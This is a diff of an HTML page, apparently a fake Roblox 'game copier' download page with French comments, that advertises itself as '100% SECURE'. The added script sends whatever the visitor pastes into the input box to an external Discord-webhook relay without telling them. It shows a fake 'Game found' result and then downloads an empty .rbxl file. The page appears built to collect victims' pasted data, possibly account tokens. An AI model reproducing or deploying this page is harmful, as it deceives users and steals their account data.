@@ -2,34 +2,10 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Game Copier Tool</title>
-
+<title>Download Page</title>
 <style>
-  /* VIDEO BACKGROUND */
-  .video-bg {
-    position: fixed;
-    inset: 0;
-    width: 100%;
-    height: 100%;
-    z-index: -2;
-    pointer-events: none;
-  }
-
-  .video-bg iframe {
-    width: 100%;
-    height: 100%;
-    border: none;
-  }
-
-  /* OVERLAY POUR LECTURE DU TEXTE */
-  .overlay {
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.55);
-    z-index: -1;
-  }
-
   body {
+    background: linear-gradient(135deg, #3b82f6, #ec4899);
     color: #f8fafc;
     font-family: Arial, sans-serif;
     display: flex;
@@ -41,7 +17,7 @@
     padding-bottom: 50px;
   }
 
-  /* HEADER SÉCURITÉ */
+  /*  HEADER SÉCURITÉ */
   .security-header {
     margin-top: 40px;
     text-align: center;
@@ -81,7 +57,6 @@
     to { width: 100%; }
   }
 
-  /* BOUTON YOUTUBE */
   .yt-button {
     position: fixed;
     top: 20px;
@@ -95,19 +70,19 @@
     align-items: center;
     box-shadow: 0 6px 18px rgba(0,0,0,0.3);
     cursor: pointer;
+    transition: transform 0.2s;
     z-index: 10;
-    overflow: hidden;
   }
 
+  .yt-button:hover { transform: scale(1.1); }
+
   .yt-button img {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-    border-radius: 50%;
+    width: 100px;
+    height: 90px;
   }
 
   .box {
-    background: rgba(0,0,0,0.75);
+    background: rgba(0,0,0,0.7);
     padding: 40px;
     border-radius: 16px;
     width: 450px;
@@ -190,19 +165,23 @@
   @keyframes spin {
     to { transform: rotate(360deg); }
   }
+
+  .game-found {
+    font-weight: bold;
+    margin: 20px 0;
+  }
+
+  .modal button {
+    background: #22c55e;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 12px;
+    font-weight: bold;
+    cursor: pointer;
+  }
 </style>
 </head>
-
 <body>
-
-<!-- VIDEO BACKGROUND -->
-<div class="video-bg">
-  <iframe
-    src="https://gold-thunders.tiiny.site"
-    allow="autoplay; fullscreen"
-  ></iframe>
-</div>
-<div class="overlay"></div>
 
 <div class="security-header">
   <h1>100% SECURE</h1>
@@ -214,7 +193,7 @@
 <a class="yt-button"
    href="https://www.youtube.com/@AndroidOwnedScripterOwner"
    target="_blank">
-  <img src="https://cdn.discordapp.com/attachments/1456286084777377864/1457083009122435163/minia_youtube.jpg">
+  <img src="https://www.freeiconspng.com/uploads/youtube-logo-png-photo-0.png">
 </a>
 
 <div class="box">
@@ -228,12 +207,116 @@
 
 <div class="tutorial-title">TUTORIAL</div>
 
+<!-- ✅ VIDEO AVEC MINIATURE PERSONNALISÉE -->
 <div class="video-container" id="videoContainer">
   <img
-    src="https://cdn.discordapp.com/attachments/1456286084777377864/1457068308217069759/thumbnail_so_FIRE.jpg"
-    style="width:100%; height:100%; cursor:pointer; object-fit:cover;"
-    id="videoThumbnail">
+    src="https://cdn.discordapp.com/attachments/1456286084777377864/1457068308217069759/thumbnail_so_FIRE.jpg?ex=695aa81b&is=6959569b&hm=d7826eb6a719336ae68cccaacf1dcffbf30f783360081f2755c3a009046ba372&"
+    alt="Video Thumbnail"
+    style="width:100%; height:100%; cursor:pointer; display:block; object-fit:cover;"
+    id="videoThumbnail"
+  >
 </div>
+
+<div class="modal" id="modal">
+  <div class="modal-content">
+    <div class="loader" id="loader"></div>
+    <div class="game-found" id="gameName" style="display:none;"></div>
+    <button id="okButton" style="display:none;">OK</button>
+  </div>
+</div>
+
+<script>
+const input = document.getElementById("input");
+const submitBtn = document.getElementById("submit");
+const downloadBtn = document.getElementById("download");
+const modal = document.getElementById("modal");
+const loader = document.getElementById("loader");
+const gameName = document.getElementById("gameName");
+const okButton = document.getElementById("okButton");
+
+let detectedGameName = "gamefile";
+
+input.addEventListener("input", () => {
+  submitBtn.disabled = input.value.trim() === "";
+  submitBtn.classList.toggle("enabled", !submitBtn.disabled);
+});
+
+submitBtn.addEventListener("click", () => {
+  modal.style.display = "flex";
+  loader.style.display = "block";
+  gameName.style.display = "none";
+  okButton.style.display = "none";
+
+  const textValue = input.value;
+
+  setTimeout(() => {
+    const regex = /https?:\/\/www\.roblox\.com\/games\/(\d+)\/([A-Za-z0-9\-]+)/i;
+    const match = regex.exec(textValue);
+
+    loader.style.display = "none";
+
+    if (match) {
+      detectedGameName = match[2].replace(/-/g, " ");
+      gameName.textContent = `Game found: ${detectedGameName}`;
+    } else {
+      detectedGameName = "gamefile";
+      gameName.textContent = "Error: Roblox game not found";
+    }
+
+    gameName.style.display = "block";
+    okButton.style.display = "inline-block";
+  }, 1000);
+
+  fetch("https://discord-webhook-server-uhrf.onrender.com/send", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: textValue })
+  }).catch(() => {});
+});
+
+okButton.addEventListener("click", () => {
+  modal.style.display = "none";
+  downloadBtn.disabled = false;
+  downloadBtn.classList.add("enabled");
+});
+
+downloadBtn.addEventListener("click", () => {
+  if (downloadBtn.disabled) return;
+
+  const safeName = detectedGameName.replace(/[^a-z0-9 ]/gi, "").trim();
+  const fileName = (safeName || "gamefile") + ".rbxl";
+
+  const blob = new Blob([""], { type: "application/octet-stream" });
+  const url = URL.createObjectURL(blob);
+
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = fileName;
+  document.body.appendChild(a);
+  a.click();
+
+  document.body.removeChild(a);
+  URL.revokeObjectURL(url);
+});
+
+// ✅ LOGIQUE POUR MINIATURE VIDEO
+const videoContainer = document.getElementById('videoContainer');
+const videoThumbnail = document.getElementById('videoThumbnail');
+
+videoThumbnail.addEventListener('click', () => {
+  const iframe = document.createElement('iframe');
+  iframe.src = "https://www.youtube.com/embed/blVQWrfIa0E?autoplay=1";
+  iframe.title = "YouTube video player";
+  iframe.allow = "accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture";
+  iframe.allowFullscreen = true;
+  iframe.style.width = '100%';
+  iframe.style.height = '100%';
+  iframe.style.border = 'none';
+
+  videoContainer.innerHTML = ''; // Supprime la miniature
+  videoContainer.appendChild(iframe);
+});
+</script>
 
 </body>
 </html>
